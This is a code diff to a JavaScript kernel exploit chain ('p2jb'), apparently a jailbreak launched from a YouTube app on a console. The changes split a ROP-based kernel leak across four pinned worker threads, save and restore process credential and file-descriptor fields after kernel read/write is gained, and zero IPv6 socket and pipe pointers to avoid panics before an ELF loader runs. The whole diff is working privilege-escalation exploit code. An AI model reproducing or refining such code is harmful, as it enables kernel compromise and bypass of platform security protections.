@@ -59,6 +59,7 @@
         const NUM_IPV6_SOCKETS = 64;
         const MAIN_CORE = 4;
         const MAIN_RTPRIO = 256;
+        const LEAK_KQ_REPAIR_MODE = "full";
 
         const SYSCALL_EXTRA = {
             recvmsg: 0x1bn,
@@ -273,13 +274,26 @@
             repairSlot(readBase + 6, ROP.pop_rdx);
             repairSlot(readBase + 7, 1n);
             repairSlot(readBase + 8, syscall_wrapper);
-            for (let k = 0; k < unroll; k++) {
-                const b = kqBase[k];
-                repairSlot(b + 0, ROP.pop_rax);
-                repairSlot(b + 1, SYSCALL.kqueueex);
-                repairSlot(b + 2, ROP.pop_rdi);
-                repairSlot(b + 3, POC_ARG);
-                repairSlot(b + 4, syscall_wrapper);
+            if (LEAK_KQ_REPAIR_MODE === "full") {
+                for (let k = 0; k < unroll; k++) {
+                    const b = kqBase[k];
+                    repairSlot(b + 0, ROP.pop_rax);
+                    repairSlot(b + 1, SYSCALL.kqueueex);
+                    repairSlot(b + 2, ROP.pop_rdi);
+                    repairSlot(b + 3, POC_ARG);
+                    repairSlot(b + 4, syscall_wrapper);
+                }
+            } else if (LEAK_KQ_REPAIR_MODE === "wrapper") {
+                for (let k = 0; k < unroll; k++) {
+                    repairSlot(kqBase[k] + 4, syscall_wrapper);
+                }
+            } else if (LEAK_KQ_REPAIR_MODE === "args") {
+                for (let k = 0; k < unroll; k++) {
+                    const b = kqBase[k];
+                    repairSlot(b + 1, SYSCALL.kqueueex);
+                    repairSlot(b + 3, POC_ARG);
+                    repairSlot(b + 4, syscall_wrapper);
+                }
             }
 
             emit(ROP.pop_rax); emit(1n);
@@ -765,52 +779,125 @@
 
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
-            const LEAK_UNROLL = 4096;
+            const LEAK_UNROLL = 16384;
+            const LEAK_WORKER_CORES = [0, 1, 2, 3];
             const U = BigInt(LEAK_UNROLL);
-            const BPLUS1 = TOTAL_SYSCALLS / U;
-            const NORMAL_BATCHES = BPLUS1 - 1n;
-            const WORKER_CALLS = BPLUS1 * U;
-            const REMAINDER = TOTAL_SYSCALLS - WORKER_CALLS;
+            const LEAK_WORKERS = LEAK_WORKER_CORES.length;
 
             my_init_threading();
-            const [lk_r, lk_w] = create_pipe();
-            const lk_rfd = Number(lk_r), lk_wfd = Number(lk_w);
 
-            syscall(SYSCALL.fcntl, BigInt(lk_wfd), F_SETFL, O_NONBLOCK);
-
-            const finished = malloc(8); write64(finished, 0n);
-            const dummybuf = malloc(8);
-            const FEED_CHUNK = 4096;
+            const FEED_CHUNK = 65536;
             const chunkbuf = malloc(FEED_CHUNK);
-            const lw = build_leak_worker_chain(2, lk_rfd, finished, dummybuf,
-                LEAK_UNROLL, Number(REMAINDER));
-            spawn_leak_worker(lw.entry);
 
-            let queued = 0n;
-            while (queued < NORMAL_BATCHES) {
-                let want = NORMAL_BATCHES - queued;
-                if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
-                const n = syscall(SYSCALL.write, BigInt(lk_wfd), chunkbuf, want);
-                if (n > 0n && n <= BigInt(FEED_CHUNK)) queued += n;
-                await js_sleep(500);
+            const leak_workers = [];
+            let assigned = 0n;
+            for (let i = 0; i < LEAK_WORKERS; i++) {
+                let worker_total = TOTAL_SYSCALLS / BigInt(LEAK_WORKERS);
+                if (i === LEAK_WORKERS - 1) worker_total = TOTAL_SYSCALLS - assigned;
+                assigned += worker_total;
+
+                const bplus1 = worker_total / U;
+                const normal_batches = bplus1 - 1n;
+                const worker_calls = bplus1 * U;
+                const remainder = worker_total - worker_calls;
+                if (bplus1 <= 0n) fail("leak worker " + i + " syscall split too small");
+
+                const [lk_r, lk_w] = create_pipe();
+                const lk_rfd = Number(lk_r), lk_wfd = Number(lk_w);
+                syscall(SYSCALL.fcntl, BigInt(lk_wfd), F_SETFL, O_NONBLOCK);
+
+                const finished = malloc(8); write64(finished, 0n);
+                const dummybuf = malloc(8);
+                const lw = build_leak_worker_chain(
+                    LEAK_WORKER_CORES[i], lk_rfd, finished, dummybuf,
+                    LEAK_UNROLL, Number(remainder),
+                );
+
+                let pre_want = normal_batches;
+                if (pre_want > BigInt(FEED_CHUNK)) pre_want = BigInt(FEED_CHUNK);
+                const pre_n = syscall(SYSCALL.write, BigInt(lk_wfd), chunkbuf, pre_want);
+                let queued = 0n;
+                if (pre_n > 0n && pre_n <= pre_want) queued = pre_n;
+
+                leak_workers.push({
+                    rfd: lk_rfd,
+                    wfd: lk_wfd,
+                    finished,
+                    normal_batches,
+                    queued,
+                    chain: lw,
+                });
+            }
+
+            for (const w of leak_workers) spawn_leak_worker(w.chain.entry);
+            let full_spins = 0;
+            while (true) {
+                let done = true;
+                let wrote = false;
+                for (const w of leak_workers) {
+                    if (w.queued >= w.normal_batches) continue;
+                    done = false;
+                    for (let refill = 0; refill < 8 && w.queued < w.normal_batches; refill++) {
+                        let want = w.normal_batches - w.queued;
+                        if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
+                        const n = syscall(SYSCALL.write, BigInt(w.wfd), chunkbuf, want);
+                        if (n === 0xffffffffffffffffn || n === 0n) break;
+                        if (n > 0n && n <= want) {
+                            w.queued += n;
+                            wrote = true;
+                        } else {
+                            break;
+                        }
+                    }
+                }
+                if (done) break;
+                if (wrote) {
+                    full_spins = 0;
+                } else {
+                    syscall(SYSCALL.sched_yield);
+                    if (++full_spins >= 64) {
+                        full_spins = 0;
+                        await js_sleep(1);
+                    }
+                }
             }
 
             while (true) {
-                write64(finished, 0n);
-                await js_sleep(1500);
-                if (read64(finished) === 0n) break;
+                for (const w of leak_workers) write64(w.finished, 0n);
+                await js_sleep(250);
+                let all_blocked = true;
+                for (const w of leak_workers) {
+                    if (read64(w.finished) !== 0n) {
+                        all_blocked = false;
+                        break;
+                    }
+                }
+                if (all_blocked) break;
             }
 
-            write64(lw.pivotAddr, lw.exitAddr);
-            write64(finished, 0n);
-            syscall(SYSCALL.write, BigInt(lk_wfd), chunkbuf, 1n);
+            for (const w of leak_workers) {
+                write64(w.chain.pivotAddr, w.chain.exitAddr);
+                write64(w.finished, 0n);
+                syscall(SYSCALL.write, BigInt(w.wfd), chunkbuf, 1n);
+            }
             {
                 const dl = Date.now() + 15000;
-                while (read64(finished) !== EXIT_MARK && Date.now() < dl)
+                while (Date.now() < dl) {
+                    let all_exited = true;
+                    for (const w of leak_workers) {
+                        if (read64(w.finished) !== EXIT_MARK) {
+                            all_exited = false;
+                            break;
+                        }
+                    }
+                    if (all_exited) break;
                     await js_sleep(50);
+                }
             }
-            syscall(SYSCALL.close, BigInt(lk_rfd));
-            syscall(SYSCALL.close, BigInt(lk_wfd));
+            for (const w of leak_workers) {
+                syscall(SYSCALL.close, BigInt(w.rfd));
+                syscall(SYSCALL.close, BigInt(w.wfd));
+            }
 
             for (let i = 0; i < free_fds_num; i++) {
                 const fd = new_free_fd();
@@ -1252,6 +1339,7 @@
             }
             if (!verified) fail("stage3: verify failed");
             await ulog("stage3: kernel r/w achieved");
+            S.kernel_rw_ready = true;
 
             await stage3_cleanup(S);
         }
@@ -1419,6 +1507,22 @@
             S.proc_ucred = S.kread64(curproc + S.OFF.PROC_UCRED);
             S.proc_fd = S.kread64(curproc + S.OFF.PROC_FD);
             await ulog("stage4: curproc=" + toHex(curproc) + " fd=" + toHex(S.proc_fd));
+
+            // Save original ucred and fd values for cleanup on exit (prevents panic on close)
+            S.orig_ucred = {
+                uid: S.kread32(S.proc_ucred + S.OFF.UCRED_CR_UID),
+                ruid: S.kread32(S.proc_ucred + S.OFF.UCRED_CR_RUID),
+                svuid: S.kread32(S.proc_ucred + S.OFF.UCRED_CR_SVUID),
+                rgid: S.kread32(S.proc_ucred + S.OFF.UCRED_CR_RGID),
+                ngroups: S.kread32(S.proc_ucred + S.OFF.UCRED_CR_NGROUPS),
+                attrs: S.kread64(S.proc_ucred + 0x80n),
+                authid: S.kread64(S.proc_ucred + S.OFF.UCRED_CR_SCEAUTHID),
+                caps0: S.kread64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0),
+                caps1: S.kread64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1)
+            };
+            S.orig_fd_rdir = S.kread64(S.proc_fd + S.OFF.FD_RDIR);
+            S.orig_fd_jdir = S.kread64(S.proc_fd + S.OFF.FD_JDIR);
+            await ulog("stage4: saved orig_ucred (uid=" + S.orig_ucred.uid + ") orig_fd_rdir=" + toHex(S.orig_fd_rdir));
 
             await force_td_ucred_migrate(S);
 
@@ -1667,27 +1771,6 @@
                     ipv6_kernel_rw.data.master_sock + " victim_sock=" +
                     ipv6_kernel_rw.data.victim_sock + ")");
 
-                const pin_sock = (fd) => {
-                    const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
-                    if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
-                    const so = S.kread64(fp);
-                    if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
-                    S.kwrite32(so, 0x100);
-                };
-                pin_sock(ipv6_kernel_rw.data.master_sock);
-                pin_sock(ipv6_kernel_rw.data.victim_sock);
-
-                const pin_pipe_fd = (fd) => {
-                    const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
-                    if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
-                    const rc = S.kread32(fp + 0x28n);
-                    if (rc > 0n && rc < 0x10000n)
-                        S.kwrite32(fp + 0x28n, Number(rc) + 0x100);
-                };
-                pin_pipe_fd(ipv6_kernel_rw.data.pipe_read_fd);
-                pin_pipe_fd(ipv6_kernel_rw.data.pipe_write_fd);
-                await ulog("stage_elfldr: handoff pipe + sockets pinned");
-
                 const elf_data = read_file(elf_path);
                 await ulog("stage_elfldr: read " + elf_data.length +
                     " bytes; parsing...");
@@ -1707,6 +1790,86 @@
                 await ulog("stage_elfldr: failed: " + e.message);
                 send_notification("Stage 7\nelfldr failed: " + e.message +
                     "\n(jailbreak still complete)");
+            } finally {
+                await cleanup_ipv6_kernel_rw(S);
+            }
+        }
+
+        async function cleanup_ipv6_kernel_rw(S) {
+            try {
+                const so_pcb_off = S.OFF.SO_PCB || 0x18n;
+                const pktopts_off = S.OFF.INPCB_PKTOPTS || 0x120n;
+
+                const zero_sock_pktopts = (fd, label) => {
+                    if (fd === undefined || fd < 0) return;
+                    try {
+                        const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
+                        if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
+                        const so = S.kread64(fp);
+                        if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
+                        const pcb = S.kread64(so + so_pcb_off);
+                        if (pcb === 0n || (pcb >> 48n) !== 0xFFFFn) return;
+                        const pktopts = S.kread64(pcb + pktopts_off);
+                        if (pktopts === 0n || (pktopts >> 48n) !== 0xFFFFn) return;
+                        // Zero ALL pointer fields in pktopts to prevent any
+                        // double-free / UAF when the kernel closes the socket.
+                        // ip6po_rthdr in particular is used by ipv6_kernel_rw.
+                        S.kwrite64(pktopts + 0x00n, 0n);                 // ip6po_m
+                        S.kwrite64(pktopts + 0x10n, 0n);                 // ip6po_pktinfo
+                        S.kwrite64(pktopts + 0x18n, 0n);                 // ip6po_nexthop
+                        S.kwrite64(pktopts + S.OFF.IP6PO_RTHDR, 0n);     // ip6po_rthdr
+                        S.kwrite64(pktopts + 0x38n, 0n);                 // ip6po_rthdr2
+                        S.kwrite64(pktopts + 0x40n, 0n);                 // ip6po_dest1
+                        S.kwrite64(pktopts + 0x48n, 0n);                 // ip6po_dest2
+                    } catch (_) { }
+                };
+
+                if (typeof ipv6_kernel_rw !== "undefined" && ipv6_kernel_rw.data) {
+                    const d = ipv6_kernel_rw.data;
+                    zero_sock_pktopts(d.master_sock, "master_sock");
+                    zero_sock_pktopts(d.victim_sock, "victim_sock");
+
+                    if (d.pipe_addr !== undefined && d.pipe_addr !== 0n && (d.pipe_addr >> 48n) === 0xFFFFn) {
+                        try {
+                            S.kwrite64(d.pipe_addr + 0x00n, 0n);
+                            S.kwrite64(d.pipe_addr + 0x08n, 0n);
+                            S.kwrite64(d.pipe_addr + 0x10n, 0n);
+                            S.kwrite64(d.pipe_addr + 0xD8n, 0n);  // pp_sigio
+                        } catch (_) { }
+                    }
+                }
+
+                await ulog("cleanup: ipv6_kernel_rw state neutralized");
+            } catch (e) {
+                try { await ulog("cleanup: ipv6_kernel_rw failed: " + e.message); } catch (_) { }
+            }
+        }
+
+        // Cleanup kernel state before exit to prevent panic on YouTube close
+        async function cleanup_kernel_state(S) {
+            if (!S.orig_ucred || S.proc_ucred === 0n) {
+                await ulog("cleanup: no saved state, skipping");
+                return;
+            }
+            await ulog("cleanup: restoring kernel state for safe exit");
+            try {
+                // Restore fd rdir/jdir (most critical for exit path)
+                if (S.orig_fd_rdir !== 0n && (S.orig_fd_rdir >> 48n) === 0xFFFFn) {
+                    S.kwrite64(S.proc_fd + S.OFF.FD_RDIR, S.orig_fd_rdir);
+                }
+                if (S.orig_fd_jdir !== 0n && (S.orig_fd_jdir >> 48n) === 0xFFFFn) {
+                    S.kwrite64(S.proc_fd + S.OFF.FD_JDIR, S.orig_fd_jdir);
+                }
+                // Restore ucred fields (keep authid/caps for elfldr functionality)
+                S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_UID, S.orig_ucred.uid);
+                S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RUID, S.orig_ucred.ruid);
+                S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_SVUID, S.orig_ucred.svuid);
+                S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RGID, S.orig_ucred.rgid);
+                S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_NGROUPS, S.orig_ucred.ngroups);
+                S.kwrite64(S.proc_ucred + 0x80n, S.orig_ucred.attrs);
+                await ulog("cleanup: kernel state restored");
+            } catch (e) {
+                await ulog("cleanup: failed: " + e.message);
             }
         }
 
@@ -1740,45 +1903,61 @@
         await ulog("pipes master=" + S.master_rfd + "," + S.master_wfd +
             " victim=" + S.victim_rfd + "," + S.victim_wfd);
 
-        /*const MAX_MASTER_RFD = 34;
+        const MAX_MASTER_RFD = 34;
         if (S.master_rfd > MAX_MASTER_RFD) {
             fail("pipe shift detected (got master=" + S.master_rfd + "," +
                 S.master_wfd + " victim=" + S.victim_rfd + "," + S.victim_wfd +
                 ", need master_rfd <= " + MAX_MASTER_RFD + ") - host noisy, " +
                 "restart YouTube, wait longer, retry. Kernel UNTOUCHED.");
-        }*/
-        await ulog("host OK - starting ~2 hour leak; no further log output " +
-            "until stage 0 (this is normal, do not interrupt)");
+        }
+        await ulog("host OK - starting 4-worker leak burn; no further log output " +
+            "until stage 0 (do not interrupt)");
 
-        setup_workers(S);
-        setup_ipv6_spray(S);
+        let cleanup_done = false;
+        try {
+            setup_workers(S);
+            setup_ipv6_spray(S);
 
-        apply_main_thread_pinning(S);
-        await prepare_fds(S);
-        await stage0(S);
+            apply_main_thread_pinning(S);
+            await prepare_fds(S);
+            await stage0(S);
 
-        let s123_ok = false;
-        for (let r = 1; r <= 8 && !s123_ok; r++) {
-            try {
-                await stage1(S);
-                await stage2(S);
-                await stage3(S);
-                s123_ok = true;
-            } catch (e) {
-                if (r < 8) {
-                    try { repair_triplets(S); } catch (_) { }
-                    nanosleep_ms(500);
+            let s123_ok = false;
+            for (let r = 1; r <= 8 && !s123_ok; r++) {
+                try {
+                    await stage1(S);
+                    await stage2(S);
+                    await stage3(S);
+                    s123_ok = true;
+                } catch (e) {
+                    if (r < 8) {
+                        try { repair_triplets(S); } catch (_) { }
+                        nanosleep_ms(500);
+                    }
                 }
             }
+            if (!s123_ok) fail("stages 1-3 failed after 8 attempts");
+
+            await stage4(S);
+            await stage5(S);
+
+            await stage6(S);
+            await stage7(S);
+            await stage_load_elf(S);
+
+            // Cleanup kernel state before marking complete (prevents panic on YouTube close)
+            await cleanup_kernel_state(S);
+            cleanup_done = true;
+
+        } catch (e) {
+            if (S.kernel_rw_ready && !cleanup_done) {
+                try {
+                    await cleanup_ipv6_kernel_rw(S);
+                    await cleanup_kernel_state(S);
+                } catch (_) { }
+            }
+            throw e;
         }
-        if (!s123_ok) fail("stages 1-3 failed after 8 attempts");
-
-        await stage4(S);
-        await stage5(S);
-
-        await stage6(S);
-        await stage7(S);
-        await stage_load_elf(S);
 
         await ulog("=== p2jb complete ===");
 
